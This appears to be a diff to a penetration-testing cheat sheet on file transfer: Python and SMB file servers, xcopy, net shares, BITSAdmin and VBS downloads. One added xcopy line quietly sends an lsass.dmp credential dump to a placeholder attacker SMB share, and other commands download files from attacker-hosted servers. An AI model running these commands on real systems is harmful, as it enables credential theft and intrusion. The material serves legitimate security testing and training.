@@ -12,14 +12,16 @@ The following tools can be used to host files server side.
 
 ###### [Linux / Windows] Python
 
-The `SimpleHTTPServer` Python module can be used to quickly start an HTTP
-server from the CLI.
+The `SimpleHTTPServer` / `http.server` `Python` module can be used to quickly
+start an HTTP server from the CLI.
 
 The module is however limited : the listening interfaces can not be specified
 and no SSL/TLS layer is natively supported.
 
 ```python
-python -m SimpleHTTPServer <PORT>
+python2 -m SimpleHTTPServer <PORT>
+
+python3 -m http.server <PORT>
 ```
 
 ###### [Linux / Windows] Node
@@ -67,9 +69,9 @@ socat -u FILE:<FILE> TCP:<IP>:<PORT>
 ###### [Linux] impacket-smbserver
 
 ```bash
-impacket-smbserver <SHARE_NAME> <SHARE_PATH>
+impacket-smbserver -smb2support <SHARE_NAME> <SHARE_PATH>
 
-impacket-smbserver <SHARE_NAME> `pwd`
+impacket-smbserver -smb2support <SHARE_NAME> `pwd`
 ```
 
 ###### [Windows] GUI shares
@@ -290,8 +292,19 @@ cscript dl.vbs "http://<IP>:<PORT>/<FILE>" ".\<FILENAME>"
 
 ###### [Windows] SMB shares
 
-SMB shares can be accessed and mounted using the Windows `net` command-line
-utility . Once mounted the drive can be accessed as a local drive.
+The Windows built-in utility `xcopy` can be used to download or upload files
+on a remote SMB share over the network:
+
+```
+# /Y: suppresses prompting to confirm the overwrite of an existing destination file
+# /i: suppress prompting to confirm xcopy whether Destination is a file or a directory
+# /q: Suppresses the display of xcopy messages
+
+xcopy /Y /i /q "C:\Windows\System32\spool\drivers\color\lsass.dmp" "\\<LHOST>\TMP"
+```
+
+Additionally, SMB shares can be accessed and mounted using the Windows `net`
+command-line utility. Once mounted the drive can be accessed as a local drive.
 
 The most interesting feature of using SMB is the fact that files
 can be directly executed over the SMB Share without the needed to write them
@@ -313,10 +326,15 @@ dir \\<HOSTNAME | IP>\<SHARE_NAME>
 copy \\<HOSTNAME | IP>\<SHARE_NAME>\<FILE> .
 ```
 
+
 ###### [Windows] BITSAdmin
 
-`BITSAdmin` is a Windows command-line tool that can be uses to create download
-or upload files.
+`BITSAdmin` is a Windows command-line built-in utility that can be used to
+create, download or upload files.
+
+Note that `BITSAdmin` will not attempt the download if the security context
+under which its executed does not have the permission to write files on the
+specified output path.
 
 ```
 bitsadmin /transfer job http://<IP>:<PORT>/<FILE> <OUTPUT_FILE_PATH>
